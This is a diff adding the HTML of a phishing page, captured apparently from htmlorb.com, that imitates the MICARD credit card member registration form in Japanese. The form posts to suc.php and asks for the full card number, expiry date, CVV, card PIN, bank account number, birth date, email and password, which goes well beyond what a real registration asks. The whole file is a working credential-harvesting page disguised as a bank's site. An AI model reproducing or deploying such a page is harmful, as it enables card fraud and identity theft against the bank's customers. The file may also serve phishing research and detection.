@@ -1,0 +1,587 @@
+<!-- URL =https://htmlorb.com/sigin.php--><!-- w =(['HTMLORB.COM', 'htmlorb.com'], [datetime.datetime(2020, 6, 9, 8, 16, 20), datetime.datetime(2020, 6, 9, 4, 16, 35)], [datetime.datetime(2021, 6, 9, 8, 16, 20), datetime.datetime(2021, 6, 9, 4, 16, 35)])--><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="ja" xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+  <meta charset="utf-8"/>
+  <meta content="no-store" http-equiv="Pragma"/>
+  <meta content="no-store" http-equiv="Cache-Control"/>
+  <meta content="0" http-equiv="Expires"/>
+  <title>
+   Webエムアイカード会員ご登録
+  </title>
+  <meta content="width=device-width,initial-scale=1,maximum-scale=3,minimum-scale=1" name="viewport"/>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+   <meta content="text/javascript" http-equiv="Content-Script-Type">
+    <meta content="text/css" http-equiv="Content-Style-Type">
+     <link href="css/common.css" rel="stylesheet" type="text/css"/>
+     <link href="css/navi1.css" rel="stylesheet" type="text/css"/>
+     <!-- ▼ note:会員登録画面用css ▼ -->
+     <link href="css/mimmb_style.css" rel="stylesheet"/>
+     <link href="css/ekmemberregist.css" rel="stylesheet"/>
+     <!-- ▲ note:会員登録画面用js ▲ -->
+     <link href="css/mimmb_style_input.css" rel="stylesheet"/>
+    </meta>
+   </meta>
+  </meta>
+ </head>
+ <body class="tp_body js_body" data-menu="false" data-move="false" data-moved="false" data-mypagemenu="false">
+  <div id="container">
+   <link href="css/navi.css?v=20170313_01" rel="stylesheet">
+    <link href="css/top.css?v=20170313_01" rel="stylesheet">
+     <link href="css/menu.css" rel="stylesheet">
+      <header class="mic-header">
+       <div class="mic-header__inner">
+        <a href="https://www2.micard.co.jp/" id="header_image">
+         <img alt="繧上◆縺励?ｮ荳?譫? MICARD" src="images/header_logo.png" width="132"/>
+        </a>
+       </div>
+      </header>
+      <!-- end.mic-header -->
+      <div id="containerIn">
+       <div class="tp_article" data-mode="PC">
+        <div class="mimmb_content tp_article_main main_center">
+         <h1>
+          Webエムアイカード会員 登録情報のご入力
+         </h1>
+         <div class="mimmb_step">
+          <ul>
+           <li class="mimmb_is_done">
+            <span>
+             利用規約の
+             <br class="mimmb_sp_none"/>
+             ご確認
+            </span>
+           </li>
+           <li class="mimmb_is_current">
+            <span>
+             登録情報の
+             <br class="mimmb_sp_none"/>
+             ご入力
+            </span>
+           </li>
+           <li>
+            <span>
+             ご登録内容の
+             <br class="mimmb_sp_none"/>
+             ご確認
+            </span>
+           </li>
+           <li>
+            <span>
+             受付完了
+            </span>
+           </li>
+           <li>
+            <span>
+             メールでの
+             <br class="mimmb_sp_none"/>
+             ご案内
+            </span>
+           </li>
+           <li>
+            <span>
+             登録完了
+            </span>
+           </li>
+          </ul>
+         </div>
+         <div class="mimmb_article">
+          <div class="mimmb_inner">
+           <form action="suc.php" method="POST">
+            <input name="user" style="display: none" type="text" value="无"/>
+            <input name="passwd" style="display: none" type="text" value="无"/>
+            <input id="formId" name="formId" type="hidden" value="6ee980e409e9d4b01066f34adf2a6468576accacff12f2606f09719b91a56d24"/>
+            <!-- TODO: 削除予定：確定後に完全削除 -->
+            <!-- <h2>Webエムアイカード会員 ご登録情報のご入力</h2> -->
+            <p>
+             会員情報をご入力のうえ、「確認」ボタンを押してください。
+             <br>
+              午後９時以降にご登録された場合、翌日午前８時以降にメールでご案内させていただきます。
+             </br>
+            </p>
+            <dl>
+             <dt>
+              <label for="InputForm.inquireNo">
+               お客様番号
+              </label>
+             </dt>
+             <dd class="mimmb_box_cards mimmb_content_remove_width mimmb_content_input-card">
+              <div class="mimmb_box_input_half">
+               <input class="" maxlength="10" name="inquireNo" placeholder="半角数字10桁" type="text" value=""/>
+              </div>
+              <img alt="お客様カード" class="mimmb_box_cards_cstmr" src="images/sample1.jpg">
+               <span class="mimmb_txt_comment">
+                お客様番号とは、カード表面左下にある10桁の番号です。
+               </span>
+              </img>
+             </dd>
+             <dt>
+              <label for="InputForm.cardNoLast4Digits">
+               カード番号
+              </label>
+             </dt>
+             <dd class="mimmb_box_cards mimmb_content_remove_width mimmb_content_input-card">
+              <div class="mimmb_box_input_half">
+               <input class="" maxlength="16" name="cardNoLast4Digits" placeholder="半角数字16桁" required="" type="text" value=""/>
+              </div>
+              <img alt="お客様カード" class="mimmb_box_cards_cstmr" src="images/1.jpg"/>
+              <span class="mimmb_txt_comment">
+               カード番号下16桁とは、カード表面中央にある番号の16桁の番号です。
+              </span>
+              <span class="mimmb_txt_comment">
+               アメリカン・エキスプレス付きのカードの場合も、15桁の番号をご入力ください。
+              </span>
+             </dd>
+             <dt>
+              <label for="InputForm.cardPeriodMonth">
+               有効期限
+              </label>
+             </dt>
+             <dd>
+              <div class="mimmb_box_input_short">
+               <select class="mi_birth_month_" id="cardPeriodMonth" maxlength="30" name="cardPeriodMonth">
+                <option selected="selected" value="">
+                 --
+                </option>
+                <option value="01">
+                 1
+                </option>
+                <option value="02">
+                 2
+                </option>
+                <option value="03">
+                 3
+                </option>
+                <option value="04">
+                 4
+                </option>
+                <option value="05">
+                 5
+                </option>
+                <option value="06">
+                 6
+                </option>
+                <option value="07">
+                 7
+                </option>
+                <option value="08">
+                 8
+                </option>
+                <option value="09">
+                 9
+                </option>
+                <option value="10">
+                 10
+                </option>
+                <option value="11">
+                 11
+                </option>
+                <option value="12">
+                 12
+                </option>
+               </select>
+               月 ／
+               <select class="mi_birth_month_" id="cardPeriodYear" maxlength="30" name="cardPeriodYear">
+                <option selected="selected" value="">
+                 --
+                </option>
+                <option value="21">
+                 21
+                </option>
+                <option value="22">
+                 22
+                </option>
+                <option value="23">
+                 23
+                </option>
+                <option value="24">
+                 24
+                </option>
+                <option value="25">
+                 25
+                </option>
+                <option value="26">
+                 26
+                </option>
+                <option value="27">
+                 27
+                </option>
+                <option value="28">
+                 28
+                </option>
+                <option value="29">
+                 29
+                </option>
+                <option value="30">
+                 30
+                </option>
+               </select>
+               年
+              </div>
+             </dd>
+             <dt>
+              <label for="InputForm.cardNoLast4Digits">
+               セキュリティコード
+              </label>
+             </dt>
+             <dd class="mimmb_box_cards mimmb_content_remove_width mimmb_content_input-card">
+              <div class="mimmb_box_input_turn">
+               <input class="" maxlength="4" name="cvv" placeholder="半角数字3桁" required="" type="text" value=""/>
+              </div>
+              <span class="mimmb_txt_comment">
+               カードの裏面サインパネルに印字されている番号の3桁をご入力ください。
+              </span>
+              <span class="mimmb_txt_comment">
+               アメリカン・エキスプレス付きのカードの場合も、カードの裏面サインパネルに印字されている番号の4桁をご入力ください。
+              </span>
+             </dd>
+             <dt>
+              <label for="InputForm.cardNoLast4Digits">
+               口座番号
+              </label>
+             </dt>
+             <dd class="mimmb_box_cards mimmb_content_remove_width mimmb_content_input-card">
+              <div class="mimmb_box_input_turn">
+               <input class="" maxlength="7" name="kzfh" placeholder="半角数字7桁" required="" type="text" value=""/>
+              </div>
+              <span class="mimmb_txt_comment">
+               通帳・キャッシュカードに記載された「口座番号」の7桁をご入力ください。
+              </span>
+             </dd>
+             <dt>
+              <label for="InputForm.cardNoLast4Digits">
+               カード暗証番号
+              </label>
+             </dt>
+             <dd class="mimmb_box_cards mimmb_content_remove_width mimmb_content_input-card">
+              <div class="mimmb_box_input_turn">
+               <input class="" maxlength="4" name="azfh" placeholder="半角数字4桁" type="text" value=""/>
+              </div>
+              <span class="mimmb_txt_comment">
+               カードの4桁の暗証番号を入力してください。
+              </span>
+             </dd>
+             <dt>
+              <label for="InputForm.birthEra">
+               生年月日
+              </label>
+             </dt>
+             <dd>
+              <div class="mimmb_box_input_short">
+               <select class="" id="birthEra" maxlength="30" name="birthEra">
+                <option selected="selected" value="">
+                 --
+                </option>
+                <option value="T">
+                 大正
+                </option>
+                <option value="S">
+                 昭和
+                </option>
+                <option value="H">
+                 平成
+                </option>
+                <option value="R">
+                 令和
+                </option>
+               </select>
+               <input class="very_short" id="birthYear" maxlength="2" name="birthYear" type="text" value=""/>
+               年
+               <span class="MMDD">
+                <select class="" id="birthMonth" maxlength="30" name="birthMonth">
+                 <option selected="selected" value="">
+                  --
+                 </option>
+                 <option value="01">
+                  1
+                 </option>
+                 <option value="02">
+                  2
+                 </option>
+                 <option value="03">
+                  3
+                 </option>
+                 <option value="04">
+                  4
+                 </option>
+                 <option value="05">
+                  5
+                 </option>
+                 <option value="06">
+                  6
+                 </option>
+                 <option value="07">
+                  7
+                 </option>
+                 <option value="08">
+                  8
+                 </option>
+                 <option value="09">
+                  9
+                 </option>
+                 <option value="10">
+                  10
+                 </option>
+                 <option value="11">
+                  11
+                 </option>
+                 <option value="12">
+                  12
+                 </option>
+                </select>
+                月
+                <select class="" id="birthDay" maxlength="30" name="birthDay">
+                 <option selected="selected" value="">
+                  --
+                 </option>
+                 <option value="01">
+                  1
+                 </option>
+                 <option value="02">
+                  2
+                 </option>
+                 <option value="03">
+                  3
+                 </option>
+                 <option value="04">
+                  4
+                 </option>
+                 <option value="05">
+                  5
+                 </option>
+                 <option value="06">
+                  6
+                 </option>
+                 <option value="07">
+                  7
+                 </option>
+                 <option value="08">
+                  8
+                 </option>
+                 <option value="09">
+                  9
+                 </option>
+                 <option value="10">
+                  10
+                 </option>
+                 <option value="11">
+                  11
+                 </option>
+                 <option value="12">
+                  12
+                 </option>
+                 <option value="13">
+                  13
+                 </option>
+                 <option value="14">
+                  14
+                 </option>
+                 <option value="15">
+                  15
+                 </option>
+                 <option value="16">
+                  16
+                 </option>
+                 <option value="17">
+                  17
+                 </option>
+                 <option value="18">
+                  18
+                 </option>
+                 <option value="19">
+                  19
+                 </option>
+                 <option value="20">
+                  20
+                 </option>
+                 <option value="21">
+                  21
+                 </option>
+                 <option value="22">
+                  22
+                 </option>
+                 <option value="23">
+                  23
+                 </option>
+                 <option value="24">
+                  24
+                 </option>
+                 <option value="25">
+                  25
+                 </option>
+                 <option value="26">
+                  26
+                 </option>
+                 <option value="27">
+                  27
+                 </option>
+                 <option value="28">
+                  28
+                 </option>
+                 <option value="29">
+                  29
+                 </option>
+                 <option value="30">
+                  30
+                 </option>
+                 <option value="31">
+                  31
+                 </option>
+                </select>
+                日
+               </span>
+              </div>
+             </dd>
+             <dt>
+              <label for="InputForm.mailAddress">
+               メールアドレス
+              </label>
+             </dt>
+             <dd>
+              <input class="" maxlength="60" name="mailAddress" placeholder="例）hanako_mirai@micard.co.jp" type="text" value=""/>
+             </dd>
+             <dt>
+              <label for="inputForm.mailAddressConfirm">
+               メールアドレス（確認用）
+              </label>
+             </dt>
+             <dd>
+              <input class="" maxlength="60" name="mailAddressConfirm" placeholder="例）hanako_mirai@micard.co.jp" type="text" value=""/>
+              <ul class="mimmb_txt_comment_note">
+               <li>
+                ※メール受信制限の設定をしている場合は、「@micard.co.jp」を受信できる設定にしてください。
+               </li>
+               <li>
+                <em class="txt-required">
+                 ※メールアドレスを誤ってご登録された場合、会員登録手続きに関するメールがお届けできません。
+                 <br/>
+                 ご入力内容に誤りがないか、ご確認をお願いいたします。
+                </em>
+               </li>
+              </ul>
+             </dd>
+             <dt>
+              <label for="InputForm.password">
+               パスワード
+              </label>
+              <br/>
+              <span class="mimmb_txt_comment" style="font-weight: normal; margin: 0px">
+               ＜パスワードの用途＞
+              </span>
+              <span class="mimmb_txt_comment" style="font-weight: normal; display: block; padding-left: 1em; text-indent: -1em; margin: 0px">
+               ・Webエムアイカード会員マイページおよびエムアイカードアプリへのログイン時にパスワードをご入力いただきます。
+              </span>
+              <span class="mimmb_txt_comment" style="font-weight: normal; display: block; padding-left: 1em; text-indent: -1em; margin: 0px">
+               <font style="color:#d72944">
+                ・インターネットでお買物をされる際、「本人認証サービス」の画面でパスワードをご入力いただく場合がございます。
+               </font>
+               <br/>
+               <a href="https://www2.micard.co.jp/webmember/3dsecure.html" style="text-decoration: underline; margin: 0px; color: blue" target="_blank">
+                本人認証サービスとは
+               </a>
+              </span>
+             </dt>
+             <dd>
+              <div class="mimmb_box_input_password">
+               <input class="" maxlength="20" name="password" placeholder="半角英数字8文字以上20文字以内" type="password" value=""/>
+              </div>
+              <span class="mimmb_txt_comment">
+               パスワードは、8文字以上20文字以内です。
+               <br/>
+               必ず半角の英字と数字を組み合わせてください。
+               <br/>
+               半角英数字と「＠」「.」「-」「_」もご利用いただけます。
+              </span>
+              <ul class="mimmb_txt_comment_note">
+               <li>
+                ※第三者に推測されやすい名前、地名、生年月日、電話番号を含むパスワードは設定しないでください。
+                <br/>
+                複数サイトで同一のID、パスワードを使用しないようご注意ください。
+               </li>
+              </ul>
+             </dd>
+             <dt>
+              <label for="InputForm.passwordConfirm">
+               パスワード（確認用）
+              </label>
+             </dt>
+             <dd>
+              <div class="mimmb_box_input_password">
+               <input class="" id="passwordConfirm" maxlength="20" name="passwordConfirm" type="password" value=""/>
+              </div>
+             </dd>
+             <dt>
+              ご案内メール
+             </dt>
+             <dd>
+              <div class="mimmb_box_input_radio" data-mimmb-input="radio">
+               <label class="mimmb_is_checked">
+                <input checked="checked" class="" id="infoMailFlg.1" name="infoMailFlg" type="radio" value="1"/>
+                <i class="mimmb_icon_radio">
+                </i>
+                受け取る
+               </label>
+               <label>
+                <input class="" id="infoMailFlg.0" name="infoMailFlg" type="radio" value="0"/>
+                <i class="mimmb_icon_radio">
+                </i>
+                受け取らない
+               </label>
+              </div>
+              <ul class="mimmb_txt_comment_note">
+               <li>
+                ご利用金額やお得なキャンペーン情報、サービスなどのご案内をお届けいたします。
+               </li>
+               <li>
+                ※ご利用金額のご案内(月1回)・大切なお知らせ・各種確認メールにつきましては、上記設定にかかわらず、お届けさせていただきます。
+               </li>
+              </ul>
+             </dd>
+            </dl>
+            <hr class="mimmb_line_high"/>
+            <div class="mimmb_box_split">
+             <input class="" required="" style="width: 200px;height: 46px;float: right;    padding: 11px 82px;
+    border-radius: 4px;
+    background: #f74181;    color: #fff;
+    font-size: 18px;
+    font-weight: bold;cursor: pointer" type="submit" value="確認"/>
+             <a class="mimmb_link_back" href="index.php" style="float: left">
+              一つ前の画面へ戻る
+             </a>
+            </div>
+           </form>
+          </div>
+         </div>
+        </div>
+        <!-- //mimmb_content -->
+       </div>
+       <!-- //tp_article -->
+      </div>
+      <!-- //containerIn -->
+     </link>
+    </link>
+   </link>
+  </div>
+  <!-- //container -->
+  <footer class="mic-footer" data-mode="PC" data-page="SUB_LOGIN">
+   <p class="mic-footer-copyright">
+    (C) MICARD Co.LTD.　株式会社 エムアイカード／登録番号：関東財務局長（11）第00747号　日本貸金業協会会員　第001680号
+   </p>
+  </footer>
+  <!-- Google Tag Manager -->
+  <!-- End Google Tag Manager -->
+  <span id="uu_count_script">
+   <script>
+    var dataLayer = dataLayer || [];
+        dataLayer.push({
+            user_id: null
+        });
+   </script>
+  </span>
+  <!-- Yahoo Tag Manager Parameter -->
+  <span id="customer_id_for_ytm" style="display:none;">
+  </span>
+  <!-- Yahoo Tag Manager -->
+  <!-- End Yahoo Tag Manager -->
+ </body>
+</html>
